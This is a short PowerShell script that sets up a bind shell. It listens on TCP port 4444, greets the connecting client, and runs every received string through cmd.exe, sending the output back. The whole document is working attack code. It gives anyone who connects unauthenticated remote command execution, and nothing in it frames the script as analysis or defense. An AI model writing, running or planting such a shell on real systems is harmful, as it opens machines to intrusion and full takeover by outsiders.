$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$writer.WriteLine("Connected to Bind Shell on Port 4444")

while ($true) {
    $data = New-Object System.Byte[] 1024
    $bytesRead = $stream.Read($data, 0, $data.Length)
    $cmd = (New-Object System.Text.ASCIIEncoding).GetString($data, 0, $bytesRead)
    $output = cmd.exe /c $cmd
    $writer.WriteLine($output)
}
